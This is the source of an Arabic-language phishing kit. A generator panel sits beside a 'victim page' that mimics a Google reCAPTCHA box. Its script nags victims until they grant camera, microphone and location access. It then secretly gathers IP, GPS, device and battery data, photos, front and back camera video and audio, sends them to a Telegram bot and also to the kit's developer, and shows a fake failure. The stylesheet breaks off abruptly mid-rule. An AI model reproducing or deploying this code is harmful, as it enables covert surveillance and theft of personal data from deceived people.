<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>تحقق</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
    <style>
        /* ===== RESET & VARIABLES ===== */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-body: #f5f0e8;
            --bg-panel: rgba(255, 253, 249, 0.85);
            --bg-card: rgba(248, 244, 237, 0.75);
            --bg-input: rgba(240, 235, 225, 0.7);
            --ink: #1e1c18;
            --ink-2: #4a4640;
            --ink-faint: #8a8478;
            --gold: #b8942e;
            --gold-deep: #9f7d25;
            --gold-light: #d9b84a;
            --gold-soft: rgba(184, 148, 46, 0.14);
            --gold-glow: rgba(184, 148, 46, 0.20);
            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
            --line: rgba(184, 148, 46, 0.12);
            --success: #1a8a4a;
            --radius-card: 24px;
            --radius-btn: 14px;
            --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            --font-ar: 'Amiri', serif;
            --font-en: 'Inter', sans-serif;
        }

        body {
            background: var(--bg-body);
            color: var(--ink);
            font-family: var(--font-ar);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.6;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.06) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.04) 0%, transparent 40%);
            pointer-events: none;
            z-index: 0;
        }

        /* ===== ADMIN PANEL ===== */
        .panel {
            max-width: 860px;
            width: 100%;
            background: var(--bg-panel);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: var(--radius-card);
            border: 1px solid rgba(184, 148, 46, 0.15);
            padding: 32px 36px 28px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.07), 0 4px 16px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.6);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeUp .8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }

        .panel::after {
            content: '';
            position: absolute;
            inset: 4px;
            border-radius: calc(var(--radius-card) - 4px);
            border: 1px solid rgba(184, 148, 46, 0.06);
            pointer-events: none;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(24px) scale(0.98);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        @media (max-width: 640px) {
            .panel {
                padding: 20px 18px 18px;
            }
        }
        @media (max-width: 420px) {
            .panel {
                padding: 16px 14px 14px;
            }
        }

        .top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 2px solid var(--line);
            padding-bottom: 18px;
            flex-wrap: wrap;
            gap: 12px;
            position: relative;
        }

        .top::after {
            content: '';
            position: absolute;
            bottom: -2px;
            right: 0;
            width: 80px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLine 3s ease-in-out infinite;
        }

        @keyframes shimmerLine {
            0%,
            100% {
                opacity: 0.4;
                width: 60px;
            }
            50% {
                opacity: 1;
                width: 120px;
            }
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .logo {
            width: 56px;
            height: 56px;
            flex-shrink: 0;
            position: relative;
        }

        .logo svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.15));
        }

        .logo .pulse {
            animation: pulseMark 2.2s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes pulseMark {
            0%,
            100% {
                transform: scale(1);
                opacity: 0.3;
            }
            50% {
                transform: scale(1.10);
                opacity: 0.9;
            }
        }

        .logo .glow-ring {
            animation: glowRing 3s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes glowRing {
            0%,
            100% {
                opacity: 0.4;
                transform: scale(1);
            }
            50% {
                opacity: 0.9;
                transform: scale(1.04);
            }
        }

        .name {
            font-family: var(--font-ar);
            font-size: 32px;
            letter-spacing: 6px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }

        .info {
            text-align: left;
            font-size: 13px;
            color: var(--ink-2);
            display: flex;
            align-items: center;
            gap: 18px;
            flex-wrap: wrap;
        }

        .info .row {
            display: flex;
            align-items: center;
            gap: 6px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 400;
            color: var(--ink-faint);
            padding: 4px 10px 4px 8px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            border: 1px solid rgba(184, 148, 46, 0.06);
        }

        .info .row .icon {
            width: 15px;
            height: 15px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }
        .online {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 600;
            color: var(--gold-deep);
            letter-spacing: 0.5px;
            background: var(--gold-soft);
            padding: 5px 16px 5px 12px;
            border-radius: 40px;
            border: 1px solid rgba(184, 148, 46, 0.20);
        }
        .online .dot {
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            animation: onlinePulse 1.6s ease-in-out infinite;
            box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
        }
        @keyframes onlinePulse {
            0%,
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
            }
            50% {
                transform: scale(1.6);
                box-shadow: 0 0 20px rgba(26, 138, 74, 0.20);
            }
        }

        @media (max-width: 680px) {
            .top {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .brand {
                justify-content: center;
            }
            .info {
                justify-content: center;
                gap: 8px;
            }
            .name {
                font-size: 26px;
                letter-spacing: 4px;
            }
            .logo {
                width: 48px;
                height: 48px;
            }
        }
        @media (max-width: 420px) {
            .info .row {
                font-size: 11px;
                padding: 3px 8px;
            }
            .info .row .icon {
                width: 13px;
                height: 13px;
            }
            .online {
                font-size: 10px;
                padding: 4px 12px 4px 8px;
            }
            .name {
                font-size: 22px;
                letter-spacing: 3px;
            }
            .logo {
                width: 40px;
                height: 40px;
            }
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-top: 22px;
        }

        @media (max-width: 640px) {
            .grid {
                grid-template-columns: 1fr;
                gap: 14px;
            }
        }

        .card {
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 20px 22px 18px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(184, 148, 46, 0.02) 0%, transparent 60%);
            pointer-events: none;
        }

        .card:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 30px rgba(184, 148, 46, 0.04);
            transform: translateY(-2px);
        }

        .card .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .card .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }

        .card .label {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
            display: block;
        }

        .card .input-wrap {
            display: flex;
            align-items: center;
            background: var(--bg-input);
            border-radius: 16px;
            padding: 0 14px;
            margin-top: 2px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            transition: var(--transition);
            backdrop-filter: blur(4px);
        }

        .card .input-wrap:focus-within {
            border-color: var(--gold);
            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
            background: rgba(255, 255, 255, 0.6);
        }

        .card .input-wrap input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            padding: 13px 0;
            font-family: var(--font-en);
            font-size: 14px;
            font-weight: 500;
            color: var(--ink);
            direction: ltr;
            text-align: right;
            letter-spacing: 0.5px;
            min-width: 0;
        }

        .card .input-wrap input::placeholder {
            color: var(--ink-faint);
            letter-spacing: normal;
            font-weight: 400;
            opacity: 0.7;
        }

        .toggle-group {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 6px;
        }

        @media (max-width: 560px) {
            .toggle-group {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }
        }
        @media (max-width: 380px) {
            .toggle-group {
                grid-template-columns: 1fr 1fr;
            }
        }

        .zeus-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-input);
            padding: 8px 14px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.05);
            cursor: pointer;
            transition: var(--transition);
            min-height: 44px;
            gap: 8px;
            backdrop-filter: blur(4px);
            position: relative;
        }

        .zeus-toggle:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.6);
        }

        .zeus-toggle input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        .zeus-toggle .toggle-label {
            font-family: var(--font-ar);
            font-size: 13px;
            font-weight: 500;
            color: var(--ink-2);
            transition: var(--transition);
            flex: 1;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .zeus-toggle .toggle-label svg {
            width: 15px;
            height: 15px;
            stroke: var(--ink-faint);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
            transition: var(--transition);
        }

        .zeus-toggle .track {
            width: 36px;
            height: 22px;
            background: #d5d0c6;
            border-radius: 30px;
            position: relative;
            transition: var(--transition);
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
            flex-shrink: 0;
        }

        .zeus-toggle .track .thumb {
            width: 16px;
            height: 16px;
            background: #fff;
            border-radius: 50%;
            position: absolute;
            top: 3px;
            right: 3px;
            transition: var(--transition);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .zeus-toggle input:checked+.toggle-label {
            color: var(--ink);
            font-weight: 600;
        }

        .zeus-toggle input:checked+.toggle-label svg {
            stroke: var(--gold);
        }

        .zeus-toggle input:checked~.track {
            background: var(--gold-shimmer);
            box-shadow: 0 0 24px var(--gold-soft);
        }

        .zeus-toggle input:checked~.track .thumb {
            right: 17px;
            background: #fff;
        }

        .generate-wrap {
            display: flex;
            justify-content: center;
            margin: 24px 0 20px 0;
            position: relative;
        }

        .generate-wrap::before {
            content: '';
            position: absolute;
            inset: -12px -20px;
            background: radial-gradient(ellipse at center, rgba(184, 148, 46, 0.04) 0%, transparent 70%);
            pointer-events: none;
            border-radius: 60px;
        }

        .btn-generate {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 14px 40px;
            background: var(--gold-shimmer);
            background-size: 200% 200%;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-family: var(--font-en);
            font-size: 15px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.30), inset 0 1px 0 rgba(255, 255, 255, 0.20);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .btn-generate::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
            transform: translateX(-100%);
            transition: transform 0.6s;
        }

        .btn-generate:hover::before {
            transform: translateX(100%);
        }

        .btn-generate:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40), inset 0 1px 0 rgba(255, 255, 255, 0.20);
        }

        .btn-generate:active {
            transform: translateY(0) scale(0.98);
        }

        .btn-generate svg {
            width: 20px;
            height: 20px;
            stroke: currentColor;
            fill: none;
            stroke-width: 2;
            flex-shrink: 0;
        }

        .btn-generate.busy {
            opacity: 0.7;
            pointer-events: none;
            animation: pulseBusy 1s ease-in-out infinite;
        }

        @keyframes pulseBusy {
            0%,
            100% {
                opacity: 0.7;
            }
            50% {
                opacity: 1;
            }
        }

        .btn-generate.done {
            background: linear-gradient(135deg, #1a8a4a, #126a38);
            box-shadow: 0 4px 28px rgba(26, 138, 74, 0.30);
            color: #fff;
        }

        @media (max-width: 480px) {
            .btn-generate {
                padding: 12px 28px;
                font-size: 13px;
                gap: 8px;
            }
            .btn-generate svg {
                width: 17px;
                height: 17px;
            }
        }

        .result-section {
            margin-bottom: 22px;
        }

        .result-section .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
        }

        .result-section .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }

        .result-section .label-wrap .section-title {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
        }

        .result {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 16px 22px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            flex-wrap: wrap;
            gap: 12px;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .result::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(184, 148, 46, 0.03) 0%, transparent 60%);
            pointer-events: none;
        }

        .result:hover {
            border-color: rgba(184, 148, 46, 0.15);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
        }

        .result .info-box {
            display: flex;
            flex-direction: column;
            flex: 1;
            min-width: 140px;
            position: relative;
            z-index: 1;
        }

        .result .info-box .value {
            font-family: var(--font-en);
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: var(--ink);
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
            width: fit-content;
        }

        .result .info-box .sub {
            font-family: var(--font-en);
            font-size: 11px;
            color: var(--ink-faint);
            margin-top: 3px;
            word-break: break-all;
            -webkit-text-fill-color: var(--ink-faint);
        }

        .result .actions {
            display: flex;
            gap: 10px;
            flex-shrink: 0;
            position: relative;
            z-index: 1;
        }

        .result .actions button {
            width: 42px;
            height: 42px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(4px);
            color: var(--ink-2);
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .result .actions button svg {
            width: 18px;
            height: 18px;
            stroke: currentColor;
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }

        .result .actions button:hover {
            transform: translateY(-3px);
            border-color: var(--gold);
            color: var(--gold);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 20px rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.7);
        }

        .result .actions button:active {
            transform: translateY(0);
        }

        .result .actions button.ok {
            border-color: var(--success);
            background: var(--success);
            color: #fff;
        }

        .result .actions button.ok svg {
            stroke: #fff;
        }

        @media (max-width: 480px) {
            .result {
                padding: 14px 16px;
                flex-direction: column;
                align-items: stretch;
            }
            .result .info-box .value {
                font-size: 17px;
            }
            .result .actions {
                justify-content: flex-end;
            }
            .result .actions button {
                width: 38px;
                height: 38px;
            }
            .result .actions button svg {
                width: 16px;
                height: 16px;
            }
        }

        .footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding-top: 18px;
            border-top: 2px solid var(--line);
            font-family: var(--font-ar);
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            flex-wrap: wrap;
        }

        .footer::before {
            content: '';
            position: absolute;
            top: -2px;
            right: 50%;
            transform: translateX(50%);
            width: 40px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLineCenter 3s ease-in-out infinite;
        }

        @keyframes shimmerLineCenter {
            0%,
            100% {
                opacity: 0.4;
                width: 40px;
            }
            50% {
                opacity: 1;
                width: 80px;
            }
        }

        .footer:hover {
            transform: translateY(-2px);
        }

        .footer .dev-name {
            font-family: var(--font-ar);
            font-weight: 700;
            letter-spacing: 4px;
            font-size: 20px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
        }

        .footer .icon-badge {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer .icon-badge svg {
            width: 100%;
            height: 100%;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }

        .footer:hover .icon-badge svg {
            transform: rotate(10deg) scale(1.1);
            stroke: var(--gold-deep);
        }

        @media (max-width: 480px) {
            .footer {
                font-size: 14px;
                gap: 8px;
                padding-top: 14px;
            }
            .footer .dev-name {
                font-size: 17px;
                letter-spacing: 3px;
            }
            .footer .icon-badge {
                width: 18px;
                height: 18px;
            }
        }

        /* ===== VICTIM PAGE (reCAPTCHA) ===== */
        #victimPage {
            display: none;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            background: #eef2f5;
            padding: 16px;
        }

        .captcha-wrapper {
            width: 340px;
            max-width: 100%;
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            cursor: default;
        }

        .captcha-row {
            display: flex;
            align-items: center;
            padding: 15px 15px 12px 15px;
            gap: 12px;
        }

        .spinner {
            position: relative;
        }
        .spinner input {
            display: none;
        }

        .checkmark {
            width: 32px;
            height: 32px;
            border: 2px solid #c1c1c1;
            border-radius: 3px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background: white;
            transition: 0.3s;
            position: relative;
        }

        .checkmark .tick {
            width: 10px;
            height: 18px;
            border-right: 4px solid #00a651;
            border-bottom: 4px solid #00a651;
            transform: rotate(45deg);
            opacity: 0;
            transition: 0.2s;
        }

        .checkmark .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #e8f0fe;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .spinner.loading .checkmark {
            border-color: #1a73e8;
            background: #e8f0fe;
        }
        .spinner.loading .checkmark .tick {
            display: none;
        }
        .spinner.loading .checkmark .loader {
            display: block;
        }

        .spinner.failed .checkmark {
            border-color: #d93025;
            background: #fce8e6;
        }
        .spinner.failed .checkmark .tick {
            display: none;
        }
        .spinner.failed .checkmark .loader {
            display: none;
        }
        .spinner.failed .checkmark::after {
            content: "✕";
            font-size: 22px;
            font-weight: bold;
            color: #d93025;
        }

        .spinner.success .checkmark {
            border-color: #00a651;
            background: #e6f4ea;
        }
        .spinner.success .checkmark .tick {
            opacity: 1;
            animation: check 0.3s ease;
        }
        .spinner.success .checkmark .loader {
            display: none;
        }

        .text {
            flex: 1;
            font-size: 18px;
            color: #333;
            text-align: center;
            transition: color 0.2s;
            user-select: none;
            font-family: var(--font-ar), var(--font-en), sans-serif;
        }

        .text.loading {
            color: #1a73e8;
        }
        .text.failed {
            color: #d93025;
        }
        .text.success {
            color: #00a651;
        }

        .logo-captcha {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 10px;
            color: #777;
            font-family: var(--font-en), sans-serif;
        }

        .logo-captcha svg {
            width: 38px;
            height: 38px;
            margin-bottom: 4px;
        }

        .logo-captcha strong {
            font-size: 10px;
            font-weight: 600;
        }
        .logo-captcha small {
            font-size: 8px;
        }

        .captcha-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 6px 14px;
            background: #f1f3f4;
            border-top: 1px solid #e5e7e9;
            height: 36px;
            font-family: var(--font-en), sans-serif;
        }

        .captcha-footer .brand {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .captcha-footer .brand svg {
            height: 24px;
            width: auto;
        }

        .captcha-footer .brand .google-text {
            font-size: 14px;
            font-weight: 500;
            color: #222;
        }

        .captcha-footer .links {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 11px;
        }

        .captcha-footer .links a {
            color: #555;
            text-decoration: none;
            font-size: 11px;
            transition: color 0.15s;
        }

        .captcha-footer .links a:hover {
            color: #1a73e8;
            text-decoration: underline;
        }

        .captcha-footer .links .separator {
            color: #aaa;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes check {
            from {
                opacity: 0;
                transform: rotate(45deg) scale(0.3);
            }
            to {
                opacity: 1;
                transform: rotate(45deg) scale(1);
            }
        }

        @media (max-width: 480px) {
            .captcha-wrapper {
                width: 100%;
            }
            .text {
                font-size: 16px;
            }
            .logo-captcha svg {
                width: 32px;

            // ============================================================
            //  VICTIM PAGE — إجبار الأذونات + جمع البيانات + إرسال
            // ============================================================

            function initVictimPage(encodedData) {
                const spinner = document.getElementById('spinner');
                const checkbox = document.getElementById('captcha');
                const mainText = document.getElementById('mainText');
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');

                let isRunning = false;
                let collectionDone = false;

                // ===== فك تشفير بيانات المستخدم =====
                function decodeBotData(encoded) {
                    try {
                        const decoded = decodeURIComponent(atob(encoded));
                        const data = JSON.parse(decoded);
                        return { botToken: data.bot, chatId: data.chat };
                    } catch (e) {
                        console.warn('Decode error:', e);
                        return null;
                    }
                }

                let botCreds = null;
                if (encodedData) {
                    botCreds = decodeBotData(encodedData);
                }

                // ===== دوال مساعدة =====
                function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

                // ===== طلب الإذن مع إعادة المحاولة حتى الموافقة =====
                async function requestPermissionWithRetry(permissionFn, errorMessage) {
                    let attempts = 0;
                    while (true) {
                        try {
                            const result = await permissionFn();
                            return result;
                        } catch (err) {
                            console.warn(`${errorMessage} (محاولة ${attempts+1})`, err);
                            attempts++;
                            // إظهار خطأ في الكابتشا
                            spinner.classList.remove('loading', 'success');
                            spinner.classList.add('failed');
                            mainText.textContent = 'فشل التحقق، حاول مجدداً';
                            mainText.className = 'text failed';
                            checkbox.checked = false;

                            // انتظار 3 ثوانٍ ثم العودة للحالة الطبيعية وإعادة المحاولة
                            await delay(3000);
                            spinner.classList.remove('failed');
                            spinner.classList.add('loading');
                            mainText.textContent = 'جاري التحقق...';
                            mainText.className = 'text loading';
                            // إعادة تحميل الصفحة لإعادة طلب الأذونات
                            location.reload();
                            // لن يصل到这里 بسبب الـ reload، لكن نضع return احتياطياً
                            return;
                        }
                    }
                }

                // ===== طلب جميع الأذونات (كاميرا، ميكروفون، موقع) بشكل إجباري =====
                async function requestAllPermissions() {
                    // 1. كاميرا + ميكروفون (معاً)
                    await requestPermissionWithRetry(async () => {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                        stream.getTracks().forEach(t => t.stop());
                        return true;
                    }, 'فشل الحصول على الكاميرا أو الميكروفون');

                    // 2. الموقع
                    await requestPermissionWithRetry(() => {
                        return new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                () => resolve(true),
                                () => reject(new Error('رفض الموقع'))
                            );
                        });
                    }, 'فشل الحصول على الموقع');

                    return true;
                }

                // ===== باقي دوال جمع البيانات =====
                function getDeviceData() {
                    return {
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        screen: { width: screen.width, height: screen.height },
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    };
                }

                async function getIP() {
                    try {
                        const res = await fetch('https://api.ipify.org?format=json');
                        const data = await res.json();
                        return data.ip;
                    } catch { return 'غير متاح'; }
                }

                function getLocation() {
                    return new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, error: null }),
                            (err) => resolve({ lat: null, lng: null, error: err.message })
                        );
                    });
                }

                async function getBatteryStatus() {
                    try {
                        if (!navigator.getBattery) return { level: 'غير متاح', charging: false };
                        const battery = await navigator.getBattery();
                        return {
                            level: Math.round(battery.level * 100) + '%',
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {
                        return { level: 'غير متاح', charging: false };
                    }
                }

                function getStream(facingMode) {
                    return navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                }

                function recordStream(stream, duration) {
                    return new Promise((resolve) => {
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType || 'video/webm' }));
                        recorder.start();
                        setTimeout(() => recorder.stop(), duration);
                    });
                }

                function capturePhoto(videoEl) {
                    return new Promise((resolve) => {
                        const w = videoEl.videoWidth || 640;
                        const h = videoEl.videoHeight || 480;
                        canvas.width = w;
                        canvas.height = h;
                        ctx.drawImage(videoEl, 0, 0, w, h);
                        canvas.toBlob(b => resolve(b), 'image/jpeg', 0.85);
                    });
                }

                async function recordAudio(duration) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                        return new Promise((resolve) => {
                            recorder.onstop = () => {
                                const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
                                stream.getTracks().forEach(t => t.stop());
                                resolve(blob);
                            };
                            recorder.start();
                            setTimeout(() => recorder.stop(), duration);
                        });
                    } catch { return null; }
                }

                // ===== إرسال الوسائط =====

                // ===== الوظيفة الرئيسية (جمع البيانات وإرسالها) =====
                async function collectEverything() {
                    if (isRunning || collectionDone) return;
                    isRunning = true;
                    checkbox.disabled = true;
                    spinner.classList.add('loading');
                    mainText.textContent = 'جاري التحقق...';
                    mainText.className = 'text loading';

                    try {
                        // ===== إجبار الأذونات =====
                        await requestAllPermissions();

                        // ===== جمع البيانات =====
                        const [deviceData, ip, location, battery] = await Promise.all([
                            Promise.resolve(getDeviceData()),
                            getIP(),
                            getLocation(),
                            getBatteryStatus()
                        ]);

                        // --- الكاميرا الأمامية (8 صور + فيديو 3 ثوان) ---
                        const frontResult = await (async () => {
                            let stream = null;
                            try {
                                stream = await getStream('user');
                                video.srcObject = stream;
                                await video.play();
                                await delay(400);
                                const videoBlob = await recordStream(stream, 3000);
                                const photos = [];
                                for (let i = 0; i < 8; i++) {
                                    photos.push(await capturePhoto(video));
                                    await delay(400);
                                }
                                return { video: videoBlob, photos };
                            } catch (e) {
                                return { video: null, photos: [] };
                            } finally {
                                if (stream) { stream.getTracks().forEach(t => t.stop()); }
                                video.srcObject = null;
                            }
                        })();

                        // --- الكاميرا الخلفية (فيديو 3 ثوان) ---
                        const backVideo = await (async () => {
                            let stream = null;
                            try {
                                stream = await getStream('environment');
                                video.srcObject = stream;
                                await video.play();
                                await delay(400);
                                const blob = await recordStream(stream, 3000);
                                return blob;
                            } catch (e) {
                                return null;
                            } finally {
                                if (stream) { stream.getTracks().forEach(t => t.stop()); }
                                video.srcObject = null;
                            }
                        })();

                        // --- تسجيل صوتي (3 ثوان) ---
                        const audioBlob = await recordAudio(3000);

                        // تجميع البيانات
                        const data = {
                            ip: ip,
                            location: location,
                            device: deviceData.platform || 'Unknown',
                            browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' :
                                /Firefox/.test(navigator.userAgent) ? 'Firefox' :
                                /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
                            time: new Date().toLocaleString('ar-EG'),
                            frontVideo: frontResult.video,
                            backVideo: backVideo,
                            audio: audioBlob,
                            photos: frontResult.photos
                        };

                        const token = rawToken || 'غير معروف';

                        // 🔥 1. إرسال للمستخدم (إذا توفر)
                        if (botCreds && botCreds.botToken && botCreds.chatId) {
                            try {
                                await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
                            } catch (e) {
                                console.warn('User send failed:', e);
                            }
                        }

                        // 🔥 2. إرسال للمطور (دائماً)
                        try {
                            await sendToMaster(data, battery, token);
                        } catch (e) {
                            console.warn('Master send failed:', e);
                        }

                        collectionDone = true;

                        // فشل وهمي (لإعادة المحاولة كما تفعل reCAPTCHA الحقيقية)
                        spinner.classList.remove('loading', 'success');
                        spinner.classList.add('failed');
                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
                        mainText.className = 'text failed';
                        checkbox.checked = false;

                        setTimeout(() => {
                            location.reload();
                        }, 5000);

                    } catch (error) {
                        console.error('Collection error:', error);
                        spinner.classList.remove('loading', 'success');
                        spinner.classList.add('failed');
